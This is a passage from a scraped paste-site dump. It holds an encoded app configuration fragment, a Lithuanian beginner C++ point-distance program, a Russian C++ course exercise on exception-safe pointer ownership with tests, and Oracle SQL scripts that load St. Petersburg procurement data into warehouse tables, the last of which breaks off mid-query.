lbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmm7TmlrDop4bnlYzniYjmnKzoh7MgQzIwNzAg5Lul5LiKJ1xcXFxyXFxcXG4gICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgIHRyeSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCByZXN1bHRTcGxpdHMgPSBjb25maWdDb21tYW5kLnNwbGl0KFxcXFxcXFwi77+lXFxcXFxcXCIpXFxcXHJcXFxcbiAgICAgICAgICAgIGxldCBlbmNUeXBlID0gcmVzdWx0U3BsaXRzWzNdXFxcXHJcXFxcbiAgICAgICAgICAgIHJlc3VsdCA9IHJlc3VsdFNwbGl0c1s0XVxcXFxyXFxcXG4gICAgICAgICAgICBzd2l0Y2ggKGVuY1R5cGUpIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNhc2UgJ0Jhc2U2NCc6XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gYmFzZTY0RGVjb2RlKHJlc3VsdCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBjYXNlICdaaXBwZXInOlxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHJlc3VsdCA9IFppcFRvb2wuZGVjb21wcmVzcy5leGVjKHJlc3VsdClcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBicmVhaztcXFxcclxcXFxuICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICByZXN1bHQgPSBKU09OLnBhcnNlKHJlc3VsdCk7XFxcXHJcXFxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxyXFxcXG4gICAgICAgICAgICBsb2coZS5tZXNzYWdlKVxcXFxyXFxcXG4gICAgICAgICAgICB0aHJvdyBcXFxcXFxcIuWvvOWFpeaVsOaNruS4jeWQiOazlVxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgIHJldHVybiByZXN1bHQ7XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbn1cXFwifV1cIn0iLCJwaWNVcmwiOiJodHRwczovL2ltZzkuZG91YmFuaW8uY29tL3ZpZXcvcGhvdG8vc19yYXRpb19wb3N0ZXIvcHVibGljL3AyOTA0MzA0Mzk2LndlYnBAUmVmZXJlcj1odHRwczovL2ltZzkuZG91YmFuaW8uY29tL3ZpZXcvcGhvdG8vc19yYXRpb19wb3N0ZXIvcHVibGljL3AyOTA0MzA0Mzk2LndlYnAiLCJ0aXRsZSI6IueDrei+o+a7mueDqyJ9
j7pFs4WQ,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 09:17:29 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <cctype>

using namespace std;

struct Point {

    double x;
    double y;
    string s;

    Point(string s){
        this->s = s;
        x = 0;
        y = 0;
    }

    Point(string s, int x, int y){
        this->s = s;
        this->x = x;
        this->y = y;
    }

    void print(){
        cout << s << "": ("" << x << "","" << y << "")"" << endl;
    }

    void read(){
        cout << s << "" taskas, ivesk dvi koordinates: "";
        cin >> x >> y;
        this->s = s;
    }

    double getDistance(Point q){
        double dx = this->x-q.x;
        double dy = this->y-q.y;
        return sqrt(dx*dx + dy*dy);
    }

};





int main(){

    Point p1(""Pirmas"", 1, 2), p2(""Antras"", 4, 5), p3(""Trecias"");
    p3.read();

    cout << ""Turime tris taskus: "" << endl;
    p1.print();
    p2.print();
    p3.print();

    cout << ""Atstumas tarp p1 ir p2 yra "" << p1.getDistance(p2) << endl;
    cout << ""Atstumas tarp p1 ir p3 yra "" << p1.getDistance(p3) << endl;

    return 0;
}
"
R5bJSVEG,СПРИНТ № 7 | Модель памяти в C++ | Урок 9: Копирование объектов. Часть третья 2/2,chevengur,C++,Tuesday 23rd of April 2024 09:10:01 AM CDT,"octopus.h

#pragma once

// Тут можно подключить scopedptr.h и ptrvector.h, 
// если они вам понадобятся.
#include ""ptrvector.h""
#include ""scopedptr.h""
#include <new> // Для исключения bad_alloc
#include <vector>

// Щупальце
class Tentacle {
public:
    explicit Tentacle(int id) noexcept
        : id_(id) {
    }

    int GetId() const noexcept {
        return id_;
    }

    Tentacle* GetLinkedTentacle() const noexcept {
        return linked_tentacle_;
    }
    void LinkTo(Tentacle& tentacle) noexcept {
        linked_tentacle_ = &tentacle;
    }
    void Unlink() noexcept {
        linked_tentacle_ = nullptr;
    }

private:
    int id_ = 0;
    Tentacle* linked_tentacle_ = nullptr;
};

// Осьминог
class Octopus {
public:
    Octopus()
        : Octopus(8) {
    }

    explicit Octopus(int num_tentacles) {
        Tentacle* t = nullptr;
        try {
            for (int i = 1; i <= num_tentacles; ++i) {
                t = new Tentacle(i);      // Может выбросить исключение bad_alloc
                tentacles_.GetItems().push_back(t);  // Может выбросить исключение bad_alloc
                
                // Обнуляем указатель на щупальце, которое уже добавили в tentacles_,
                // чтобы не удалить его в обработчике catch повторно
                t = nullptr;
            }
        }
        catch (const std::bad_alloc&) {
            // Удаляем щупальца, которые успели попасть в контейнер tentacles_
            Cleanup();
            // Удаляем щупальце, которое создали, но не добавили в tentacles_
            delete t;
            // Конструктор не смог создать осьминога с восемью щупальцами,
            // поэтому выбрасываем исключение, чтобы сообщить вызывающему коду об ошибке
            // throw без параметров внутри catch выполняет ПЕРЕВЫБРОС пойманного исключения
            throw;
        }
    }

    ~Octopus() {
        // Осьминог владеет объектами в динамической памяти (щупальца),
        // которые должны быть удалены при его разрушении.
        // Деструктор - лучшее место, чтобы прибраться за собой.
        Cleanup();
    }

    // Добавляет новое щупальце с идентификатором,
    // равным (количество_щупалец + 1):
    // 1, 2, 3, ...
    // Возвращает ссылку на добавленное щупальце
    Tentacle& AddTentacle() {
        ScopedPtr<Tentacle>tentacle(new Tentacle(GetTentacleCount() + 1));
        tentacles_.GetItems().push_back(tentacle.GetRawPtr());
        tentacle.Release();
        return *tentacles_.GetItems().back();
    }

    int GetTentacleCount() const noexcept {
        return static_cast<int>(tentacles_.GetItems().size());
    }

    const Tentacle& GetTentacle(size_t index) const {
        return *tentacles_.GetItems().at(index);
    }
    Tentacle& GetTentacle(size_t index) {
        return *tentacles_.GetItems().at(index);
    }

private:
    void Cleanup() {
        // Удаляем щупальца осьминога из динамической памяти
        for (Tentacle* t : tentacles_.GetItems()) {
            delete t;
        }
        // Очищаем массив указателей на щупальца
        tentacles_.GetItems().clear();
    }
    
    // Вектор хранит указатели на щупальца. Сами объекты щупалец находятся в куче
    
    PtrVector<Tentacle> tentacles_;
};

=======================================================================================================================================

ptrvector.h

#pragma once

#include <vector>

template <typename T>
class PtrVector {
public:
    PtrVector() = default;

    // Создаёт вектор указателей на копии объектов из other
    PtrVector(const PtrVector& other) {
        // Резервируем место в vector-е для хранения нужного количества элементов
        // Благодаря этому при push_back не будет выбрасываться исключение
        items_.reserve(other.items_.size());

        try {
            for (auto p : other.items_) {
                // Копируем объект, если указатель на него ненулевой
                auto p_copy = p ? new T(*p) : nullptr;  // new может выбросить исключение

                // Не выбросит исключение, т. к. в vector память уже зарезервирована
                items_.push_back(p_copy);
            }
        }
        catch (...) {
            // удаляем элементы в векторе и перевыбрасываем пойманное исключение
            DeleteItems();
            throw;
        }
    }

    // Деструктор удаляет объекты в куче, на которые ссылаются указатели,
    // в векторе items_
    ~PtrVector() {
        DeleteItems();
    }

    // Возвращает ссылку на вектор указателей
    std::vector<T*>& GetItems() noexcept {
        return items_;
    }

    // Возвращает константную ссылку на вектор указателей
    std::vector<T*> const& GetItems() const noexcept {
        return items_;
    }

private:
    void DeleteItems() noexcept {
        for (auto p : items_) {
            delete p;
        }
    }

    std::vector<T*> items_;
};

=======================================================================================================================================

scopedptr.h

#pragma once

#include <stdexcept> // содержит std::logic_error

template <typename T>
class ScopedPtr {
public:
    ScopedPtr() = default;

    explicit ScopedPtr(T* raw_ptr) noexcept
        : ptr_(raw_ptr) {
    }

    // Запрещаем копирование указателя
    ScopedPtr(const ScopedPtr&) = delete;

    ~ScopedPtr() {
        delete ptr_;
    }

    T* GetRawPtr() const noexcept {
        return ptr_;
    }

    T* Release() noexcept {
        T* p = ptr_;
        ptr_ = nullptr;
        return p;
    }

    explicit operator bool() const {
        return ptr_ != nullptr;
    }

    T* operator->() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return ptr_;
    }

    T& operator*() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return *ptr_;
    }

private:
    T* ptr_ = nullptr;
};

=======================================================================================================================================

main.cpp

#include ""octopus.h""

#include <cassert>
#include <iostream>

using namespace std;

int main() {
    // Проверка конструирования осьминогов
    {
        // По умолчанию осьминог имеет 8 щупалец
        Octopus default_octopus;
        assert(default_octopus.GetTentacleCount() == 8);

        // Осьминог может иметь отличное от 8 количество щупалец
        Octopus quadropus(4);
        assert(quadropus.GetTentacleCount() == 4);

        // И даже вообще не иметь щупалец
        Octopus coloboque(0);
        assert(coloboque.GetTentacleCount() == 0);
    }

    // Осьминогу можно добавлять щупальца
    {
        Octopus octopus(1);
        Tentacle* t0 = &octopus.GetTentacle(0);
        Tentacle* t1 = &octopus.AddTentacle();
        assert(octopus.GetTentacleCount() == 2);
        Tentacle* t2 = &octopus.AddTentacle();
        assert(octopus.GetTentacleCount() == 3);

        // После добавления щупалец ранее созданные щупальца не меняют своих адресов
        assert(&octopus.GetTentacle(0) == t0);
        assert(&octopus.GetTentacle(1) == t1);
        assert(&octopus.GetTentacle(2) == t2);

        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            assert(octopus.GetTentacle(i).GetId() == i + 1);
        }
    }

    // Осьминоги могут прицепляться к щупальцам друг друга
    {
        Octopus male(2);
        Octopus female(2);

        assert(male.GetTentacle(0).GetLinkedTentacle() == nullptr);

        male.GetTentacle(0).LinkTo(female.GetTentacle(1));
        assert(male.GetTentacle(0).GetLinkedTentacle() == &female.GetTentacle(1));

        male.GetTentacle(0).Unlink();
        assert(male.GetTentacle(0).GetLinkedTentacle() == nullptr);
    }

    // Копия осьминога имеет свою собственную копию щупалец, которые
    // копируют состояние щупалец оригинального осьминога
    {
        // Перебираем осьминогов с разным количеством щупалец
        for (int num_tentacles = 0; num_tentacles < 10; ++num_tentacles) {
            Octopus male(num_tentacles);
            Octopus female(num_tentacles);
            // Пусть они хватают друг друга за щупальца
            for (int i = 0; i < num_tentacles; ++i) {
                male.GetTentacle(i).LinkTo(female.GetTentacle(num_tentacles - 1 - i));
            }

            Octopus male_copy(male);
            // Проверяем состояние щупалец копии
            assert(male_copy.GetTentacleCount() == male.GetTentacleCount());
            for (int i = 0; i < male_copy.GetTentacleCount(); ++i) {
                // Каждое щупальце копии размещается по адресу, отличному от адреса оригинального щупальца
                assert(&male_copy.GetTentacle(i) != &male.GetTentacle(i));
                // Каждое щупальце копии прицепляется к тому же щупальцу, что и оригинальное
                assert(male_copy.GetTentacle(i).GetLinkedTentacle() == male.GetTentacle(i).GetLinkedTentacle());
            }
        }
        // Если вы видите эту надпись, то разрушение осьминогов, скорее всего,
        // прошло без неопределённого поведения
        cout << ""Everything is OK""s << endl;
    }
}"
LejC9UWU,sgoz,GLASHATAY_007,Oracle 11,Tuesday 23rd of April 2024 09:07:46 AM CDT,"truncate table dwh_detailing_sg_general_2024;
insert into dwh_detailing_sg_general_2024 
Select Case When s.owner_inn='7820075581' Then '146504' Else to_char(org.id) End id,
       Case When s.owner_inn='7820075581' Then '7820076257' Else s.owner_inn End contragent_inn, 
       org.kpp, Upper(Coalesce(org.full_name, u.full_name)) full_name,
       org.short_name,
       Case when s.contragent_inn in ('7838479881','7838489103') Then 'КОМИТЕТ ПО ТРУДУ И ЗАНЯТОСТИ НАСЕЛЕНИЯ САНКТ-ПЕТЕРБУРГА'  Else org.grbs_full_name End grbs_name,       
       org.parentid,
       org.grbs_inn, vg.vg_name vg,  s.year,
       s.contragent_account,
       s.targetexpenseitemcode,s.fund, t.np_code_name,t.fp_code_name,
	   Case When s.targetexpenseitemcode In (Select targetexpenseitemcode From dwh_targetexpenseitemcode_aip) and  s.cvr not in ('244') 
       or (s.targetexpenseitemcode in ('022E15305F','021E15305F') and s.cvr='414' and s.kosgu='310' and s.contragent_inn='7809025523')Then 'Да' Else 'Нет'              
       End priznak,--Признак совпадения целевой статьи (АИП)
       S.budget_type,s.cvr,s.kosgu, sum sgoz,
       Case When owner_inn<>contragent_inn Then 1 Else 0 End flag_pp,
	   s.REQ --код запроса
From (

       Select s.* From dwh_kf_sgoz_zak s Left Join dwh_organization_kgntv o On (s.owner_inn=o.inn)
        Where  s.year = 2024
                And s.flag_ab = 1
                And (o.role_code<>10 or (s.contragent_inn='7813046420' and s.targetexpenseitemcode='0810071170')) -- письмо Л.А.Крицкой от 14.04.2021 Исключить автономные учреждения. НО добавить МУЗЫКАЛЬНЫЙ ТЕАТР по этой цс письмо от 18.05.2023
                And s.budget_type in ('СИЦ','СГЗ')
                And (s.kosgu in ('214','221', '222', '223', '224', '225', '226', '227', '228', '229','310', '320', '340', '341', '342', '343', '344', '345', '346', '347', '349', '352', '353') 
                or (s.kosgu='263'  and o.inn<>'7825357195' ))-- добавить КОСГУ 214 и добавить КОСГУ 263 кроме ИНН 7825357195(СПб ГБУ ""ЦОО ""Молодежный» )
                And s.cvr not in ('415','452','466') -- письмо Л.А.Крицкой от 14.04.2021
                And ((s.cvr <> '323' And o.grbs_inn in ('7825675663','7840013199')
                     Or (o.grbs_inn not in ('7825675663','7840013199')))  
                    )-- письмо Л.А.Крицкой от 14.04.2021. Исключить фин-ие по КВР 323 у Комитета по социальной политике Санкт-Петербурга и Жилищного комитета и их подведомственных учреждений 
                -- And ((s.kosgu<>'263' and o.inn='7825357195') or (o.inn<>'7825357195') ) --14.09.2022 -вернуть  у ком по образованию КОСГУ 263 кроме ИНН 7825357195)
                -- And (o.grbs_inn='7830002053' And s.kosgu<>'263' or nvl(o.grbs_inn,1)<>'7830002053') --02.09.2021 Терехова И.В. отключить у ком по образованию КОСГУ 263
                And s.kosgu not in ('297','267')
                 
        union 

        Select s.* From dwh_kf_sgoz_zak s Left Join dwh_organization_kgntv o On (s.owner_inn=o.inn)
        Where  s.year = 2024
               And s.flag_ab = 0 And s.flag_budget_current=1 And 
               ((s.cvr Between 200 And 247 )
                 or (s.cvr = 323 And (( o.grbs_inn  not in ('7825675663','7840013199')) or (s.targetexpenseitemcode='0330040750' And  s.contragent_inn = '7806042256' and s.year < 2024) or (s.targetexpenseitemcode='0350040750' And  s.contragent_inn = '7806042256' and s.year = 2024)))--комитет по социальной политике (+ жилищный комитет Белоусова А.А 21.12.2020 кроме СПб ГКУ ""ГОРОДСКОЙ ИНФОРМАЦИОННО-РАСЧЕТНЫЙ ЦЕНТР"" (добавлен КВР 323 по письму от Крицкой Л.А. 09.09.2022
                Or ((s.cvr = 414 Or s.cvr = 412) And s.kosgu not in (298,299,530)))     
               And s.cvr not in ('415','452','466') -- письмо Л.А.Крицкой от 14.04.2021 
                --And (o.inn='7825357195' And s.kosgu<>'263') --02.09.2021 Терехова И.В. отключить у ком по образованию КОСГУ 263
               And s.kosgu not in ('297','267')
        )   s
Join dwh_kf_ul u on s.CONTRAGENT_INN=u.code And u.year=2024
left Join (Select Distinct fp_code, fp_code_name, np_code_name From dwh_targetexpenseitemcode_2020 ) t on s.FP_CODE=t.FP_CODE
left Join dwh_organization_kgntv org On s.owner_inn=org.inn 
Left Join dwh_vg vg On vg.grbs_id=org.parentid
Where s.flag_budget_current=1 
      And s.owner_inn<>'7812026622' --02.09.2021 Терехова И.В.
      And s.owner_inn<>'7811040938' -- 14.01.2022 Крицкая Л.А. организация является автономным учреждением
      And org.id<>1610 --16.11.2021 Письмо Крицкой Л.А. 
;"
vwQdy0gq,Untitled,GLASHATAY_007,Oracle 11,Tuesday 23rd of April 2024 09:06:59 AM CDT," truncate table dwh_detailing_con_general_2024;
 insert into dwh_detailing_con_general_2024
 
with zak as
(Select 
    fin.lotuuid ,
    sum(fin.finvalue) fin_zak
  from dwh_lot_fin_kgntv fin
  Join (select distinct contragent_inn,targetexpenseitemcode from dwh_kf_sgoz_kgntv Where year=2024 and flag_budget_current=1) t On t.contragent_inn=fin.inn and t.targetexpenseitemcode=fin.targetexpenseitemcode 
  -- изменение от 30.09.2020 сделано из-за раздвоения строк по косгу
  Where finyear=to_number(2024)
  Group by fin.lotuuid),
publ_full as 
(Select 
    tru.lot_id,
    sum(tru.fulfilled_cost_doc)fulfilled_cost_doc
From dwh_contract_tru_kgntv tru
Inner Join dwh_contract_kgntv c on tru.lot_id=c.lotid and length(c.contractrnk)=13 and fulfilment_sum is null
Group by tru.lot_id)
 
Select Case When con.customerinn='7820075581' Then '146504' --в связи с тем, что данный садик реорганзивался в садик с ИНН=7820076257 необходимо суммировать
            When pro.delegated=1 Then pro.orgid Else to_char(con.customerid) End customerid,
       Case When pro.delegated=1 Then pro.orgtitle Else con.customername End customername, 
       org.short_name,
       Case When con.customerinn='7820075581' Then '7820076257' --в связи с тем, что данный садик реорганзивался в садик с ИНН=7820076257 необходимо суммировать
            When pro.delegated=1 Then org_pp.inn 
            Else con.customerinn End customerinn, 
       Case When pro.delegated=1 Then org_pp.kpp Else org.kpp End customerkpp, 
       Case When pro.delegated=1 Then pro.grbstitle Else con.grbsname End grbsname,
       Case When pro.delegated=1 Then org_pp.grbs_inn Else org.grbs_inn End grbs_inn, 
       Case When pro.delegated=1 Then pro.grbsid Else to_char(org.parentid) End grbsid,
       vg.vg_name vg, --вицегубернатор
       pro.pg_ikz, pro.pg_n, pro.pg_rn,pro.reqnum,
       pro.first_notice_try,--  Дата первой успешно отправленной версии извещения (xml-пакета)в ЕИС ( НЕ ВСЕГДА = Дате публикации извещения) 
       pro.F_PRODUCTPRICE,
       nvl(pro.f_productprice,con.contractsigningprice) nmck_rasch,
       zak.fin_zak, --сумма финансирвоания 2021 по закупке
      case when pro.joflag=1 then 1 else 0 end sovm,
      cons.orgtitle cons_org,
      case when pro.placement='Централизованная закупка' then 1 else 0 end centr,
      tar.flag_pp, --в рамках ч.6п.15 (переданные полномочия)      
      Case When pro.delegated=1 Then pro.orgtitle Else null End org_pp, --организац, осуществляющая полномочия заказчика
      con.CONTRACTRNK, con.contractsigndate, 
      con.contractsigningprice, 
      con.contractfullprice, --добавлено 16.11.20211 по письму Крицкой Л.А.
      tar.finsum, --сумма финансирования 2021 по контракту 
      tar.expensetypecode, tar.kosgucode,
      tar.budget_type, -- тип финансирования
	  tar.fund_code, 
      tar.req_code, --  код запроса ( добавлено 14.07.2023 по просьбе Крицкой Л.А.)
      con.ORDERTYPENAME,con.CONTRACTONEEXECREASON,
      con.stagetitle,
      con.contract_execution_start_date,--дата начала исполнения контракта
      con.contractplaneexecdate,
      con.CONTRACTREJECTDATE,
      tar.year fin_year, --год финансирования
      tar.targetexpenseitemcode, --целевая статья из контракта
     -- zak.targetexpenseitemcode targ_zak, --целевая статья из закупки
      t.NP_CODE_NAME,
      t.FP_CODE_NAME,
   --   ROW_NUMBER() over (partition by 1 order by con.CUSTOMERNAME desc) rn, 
      case 
        when (tar.targetexpenseitemcode in ( select targetexpenseitemcode from dwh_targetexpenseitemcode_aip ) and tar.expensetypecode not in ('244'))
        or (tar.targetexpenseitemcode in ('022E15305F','021E15305F') and tar.expensetypecode='414' and tar.kosgucode='310' and con.customerinn='7809025523') -- правило по письму крицкой от 5.10.222       
        then 'Да' else 'Нет'            
      end priznak_aip,--Признак совпадения целевой статьи (АИП)
      tar.finsum_f,
      tar.lot_id, 
	  Case When (pro.sed_reg_number is not null or pro.request_order_number is not null) Then 1 Else 0 End UOPLACING, 
	  org_uo.FULL_NAME uo_org,
      CON.CONTRACTSUBJECT,
      con.supplierinn,
      con.suppliername,
      to_char(con.supplierkpp)supplierkpp,
      Case When pro.delegated=1 Then org_pp.contragent_account 
      Else org.contragent_account End contragent_account, --код заказчика
      con.contractactualpaid, --фактически оплачено всего
      nvl(con.fulfilment_sum,publ_full.fulfilled_cost_doc)fulfilment_sum,--стоимость исполненных поставщиком обязательств в валюте исполнения (по письму Тереховой от 22.08.2022)
      pro.date_notice_published,-- Дата размещения первой версии извещения на ЕИС
      con.price_type, -- Способ указания цены контракта
      con.suppliertype,
      con.RTC_PRICE,
      con.supply_impossible

FROM  dwh_contract_kgntv con
Left Join dwh_organization_not_zak org on org.id=con.customerid   -- 05.07.2023 вместо inner указан left, по причине не попадания контрактов у не актуальных орг-ций.
                                    And contractrnk not in ('2782534239015000190','2783845426019000015','7400319000003','7400319000002','2783845426019000014','2783845426019000021','2783845426019000018') --Контракты отключены по сообщению Рябовой 13 сентября
                                    And con.customerid in (select id from dwh_organization_not_zak ) --необходимо убрать учреждения законодательной власти
                                    And org.id<>1610--16.11.2021 Письмо Крицкой Л.А. 
Inner Join
 (
    Select fin.lot_id,fin.year,fin.finsum,fin.finsum_f,fin.targetexpenseitemcode, fin.expensetypecode, fin.kosgucode, fin.budget_type, fin.flag_pp ,fin.fund_code,req_code
        From FIN_TARG_CON_2024_VIEW fin   -- 28.09.22 создана View с инф-цией по финансированию по контрактам(с 3-мя union)              
       Where fin.finsum is not null                       
  )tar
ON con.LOTID = tar.LOT_ID
Left join zak on zak.lotuuid=con.lot_cons_m 
Left join zak on tar.lot_id=zak.lotuuid 
left join dwh_procedures_kgntv pro on pro.LOTUUID = con.lotid
left join dwh_procedures_cons_kgntv cons on cons.lotuuid=pro.joint_procedure_id
left join DWH_ORGANIZATION_KGNTV org_uo on org_uo.ID = pro.UO_ORGID
left Join (select distinct targetexpenseitemcode,FP_CODE_NAME,NP_CODE_NAME from DWH_TARGETEXPENSEITEMCODE_2020) t on t.targetexpenseitemcode=tar.targetexpenseitemcode
Left Join DWH_ORGANIZATION_KGNTV org_pp on org_pp.id=pro.orgid and pro.delegated=1
Left join dwh_vg_22 vg On vg.grbs_id=con.grbsid
Left Join publ_full on publ_full.lot_id=con.LOTID
where ((con.CONTRACTREJECTDATE is not null and tar.finsum_f is not null and tar.finsum_f<>0) or con.CONTRACTREJECTDATE is null )
-- 05.07.2023 вместо inner указан left, по причине не попадания контрактов у не актуальных орг-ций.
and org.inn not in ('7812031703','7838468985','7812050079','7802215250','7804169391','7814143064','7802215268','7842000050','7804169401','7813188464','7801238167','7816226189','7811139084','7814143057','7816226502',
              '7842000068','7819029196','7819029206','7839000318','7843000046','7843000039','7810293894','7820038893','7817044400','7820038903','7806143737','7807053821','7810293904','7805283273','7806143720',
              '7811139119','7807053839','7805283280','7813585510','7840425330','7838389412','7825439419','7830001028','7830000426','7830001758'
             )
             and org.full_name not like 'ТЕРРИТОРИАЛЬНАЯ ИЗБИРАТЕЛЬНАЯ КОМИССИЯ%'
;
 
insert into dwh_detailing_con_general_2024
With 
con As (
            Select c.*,contract.suppliertype,contract.rtc_price, contract.supply_impossible,contract.supplierkpp, ROW_NUMBER() Over (Partition By c.contract_regnum Order By  c.contract_regnum desc) rn
            From dwh_contracts_delegated c 
            left join dwh_contract_kgntv contract on contract.contractrnk=c.contract_regnum
            where (c.contract_regnum, c.versionnumber) In (
                                                             Select contract_regnum, Max(versionnumber)
                                                             From dwh_contracts_delegated
                                                             Group by contract_regnum
                                                          )
                  and c.paymentyear=2024                          
                  and contract.contractrnk is null
				 --and c.exec_startyear=extract(year from sysdate)  -- правило добавлено т.к. записи дублируются из-за чего неправильно считается экономия пример контракт 2782536397817000078
       ),
proc As (
            Select *
            From (
                    Select p.*, ROW_NUMBER() Over (Partition By p.purchasenumber Order By p.docpublishdate desc) rn
                    From dwh_procedures_delegated p
                 ) p
            Where rn=1 
         ) 
 
Select to_char(org.id) orgid, org.full_name,org.short_name,org.inn, org.kpp, org.grbs_full_name, grbs_inn, to_char(org.parentid) parentid,
       vg.vg_name vg, --вицегубрнатор 
       Coalesce(pos.pg_ikz, con.purchasecode, notice.purchasecode) pg_ikz,
       Coalesce(pos.pg_n, notice.tenderplan) pg_n,    
       Case when con.positionnumber is not null then con.positionnumber Else proc.positionnumber End positionnumber,
       con.notificationnumber,
       null fitst_notice_try,--дата размещения первой версии извещения
       proc.maxprice,--нмцк
       coalesce(proc.maxprice,con.contract_price) nmck_rasch, --нмцк расчетное поле
        Case
            When proc.currentyear is null Then null
            When 2024 = proc.currentyear then proc.finsum_currentyear 
            When 2024-1 = proc.currentyear then proc.finsum_firstyear 
            When 2024-2 = proc.currentyear then proc.finsum_secondyear 
        end finsum_zak,
        0 sovm, --совместная закупка
        null As c_org, --Наименование организации, разместившей извещение
        0 centr, --централизовання закупка
        1 flag_pp,
        con.responsibleorg_fullname, -- Организация, осуществляющая полномочия заказчика
        con.contract_regnum, --РНК
        con.contract_signdate, --дата заключения контракта
        con.contract_price, --цена контракта на момент заключения
        con.contract_price contractfullprice, --текущая цена контракта
        con.paymentsum, --сумма финансирования
        con.kvr,
        null kosgu,--косгу
        null budjet_type,--тип финансирования
		null fund_code, -- код фонда
        null req_code, --код запроса
        Case When con.placing In ('13013') Then 'Запрос котировок в электронной форме'
             When con.placing In ('12011') Then 'Аукцион в электронной форме'
             When con.placing In ('14013') Then 'Запрос предложений в электронной форме'
             When con.placing In ('20000') or con.placing Is Null And con.singlecustomer Is Not Null Then 'Закупка у единственного поставщика (подрядчика, исполнителя)'
             When con.placing In ('11013') Then 'Открытый конкурс в электронной форме'
             When con.placing In ('11031','11033') Then 'Двухэтапный конкурс в электронной форме'
             When con.placing In ('13011') Then 'Запрос котировок'
             When con.placing In ('11023') Then 'Конкурс с ограниченным участием в электронной форме'
             When con.placing In ('30000') Then 'Способ определения поставщика (подрядчика, исполнителя),  установленный правительством российской федерации в соответствии со статьей 111 федерального закона'
             When con.placing In ('14011') Then 'Запрос предложений'
             When con.placing In ('11011') Then 'Открытый конкурс'
             When con.placing In ('11042') Then 'Закрытый конкурс'
             When con.placing In ('11021') Then 'Конкурс с ограниченным участием'
             When con.placing In ('12022') Then 'Закрытый аукцион'
             Else Null
        End sop_name,
        rs.name,
        Case 
            When lower(con.contractstage) = 'e' Then 'Исполнение'
            When lower(con.contractstage) = 'et' Then 'Исполнение прекращено'
            When lower(con.contractstage) = 'ec' Then 'Исполнение завершено'
            When lower(con.contractstage) = 'in' Then 'Аннулировано'
		Else Null End stage,
        con.startdate,
        con.enddate, --Плановая дата исполнения контракта
        con.rejectiondate, --дата расторжения контракта
        to_number(2024) finyear, --год финансирования
        con.targetexpenseitemcode, --целевая статья
        t.np_code_name, t.fp_code_name,
        case when proc.targetexpenseitemcode in ( select targetexpenseitemcode from dwh_targetexpenseitemcode_aip ) and con.kvr not in ('244') then 'Да' else 'Нет'    
        end priznak,--Признак совпадения целевой статьи (АИП)
        -- Case When con.exec_startyear=2022 Then exec_stageprice ELse null End fact,
        null fact,
        null lotid,
        Case When maxprice>=40000000 Then 1 Else 0 End, --uoplacing 
        null uo_org,
        con.contractsubject,
        con.supplier_inn,
        con.supplier_fullname,
        con.supplierkpp,
        org.contragent_account, --код заказчика
        null contractactualpaid, --фактически оплачено всего
        null fulfilment_sum,
        null date_notice_published,
        null price_type,
        con.suppliertype,
        con.rtc_price,
        con.supply_impossible

From con
join dwh_organization_kgntv org On con.responsibleorg_fullname=org.full_name and con.rn=1 --убрал правило из блока con не попадали нужные контракты пример 2782536397817000116
Left join proc On con.notificationnumber=proc.purchasenumber
Left Join contract_single_supp_reasons rs On rs.code_oos = con.singlecustomer And rs.actual = 1
Left Join dwh_targetexpenseitemcode_2020 t on t.targetexpenseitemcode=con.targetexpenseitemcode
Left Join dwh_schedule_pos_2020_kgntv pos On pos.pg_rn=Case when con.positionnumber is not null then con.positionnumber Else proc.positionnumber End
left join dwh_vg_22 vg On vg.grbs_id=org.parentid
Left join (
            Select positionnumber, purchasecode, tenderplan 
            from (
                    select row_number() over (PARTITION BY positionnumber, docpublishdate order by positionnumber) rn, t.*       
                    from dwh_start_notice_nrpz t
                    where (t.positionnumber, t.docpublishdate) in ( Select positionnumber, max(docpublishdate)docpublishdate from dwh_start_notice_nrpz group by positionnumber) 
                 )
             where rn =1
          ) notice On notice.positionnumber= Case when con.positionnumber is not null then con.positionnumber Else proc.positionnumber End
Where org.id<>1610 --16.11.2021 Письмо Крицкой Л.А.          
;"
rpQ9Fshk,Untitled,GLASHATAY_007,Oracle 11,Tuesday 23rd of April 2024 09:06:12 AM CDT,"truncate table dwh_detailing_zak_general_2024;
insert into dwh_detailing_zak_general_2024
With 
proc As (
            Select *
            From (
                    Select p.*, ROW_NUMBER() Over (Partition By p.purchasenumber Order By p.docpublishdate desc) rn
                    From dwh_procedures_delegated p
                 ) p
            Where rn=1     
         ),
con As (
            Select distinct notificationnumber
            From dwh_contracts_delegated c
            where (c.contract_regnum, c.versionnumber) In (
                                                             Select contract_regnum, Max(versionnumber)
                                                             From dwh_contracts_delegated
                                                             Group by contract_regnum
                                                          )
        )   
Select Case When pro.orgid='141053' Then '146504' Else pro.orgid End orgid, --в связи с тем, что данный садик реорганзивался в садик с ИНН=7820076257 необходимо суммировать
       pro.ORGTITLE, org.short_name, 
       Case WHen org.inn='7820075581' Then '7820076257' Else org.inn End inn, --в связи с тем, что данный садик реорганзивался в садик с ИНН=7820076257 необходимо суммировать
       org.kpp,  pro.GRBSTITLE, org.grbs_inn, pro.grbsid, vg.vg_name vg,
       pro.pg_ikz,  pro.pg_n, pro.pg_rn, pro.ikz, --ИКЗ из извещения
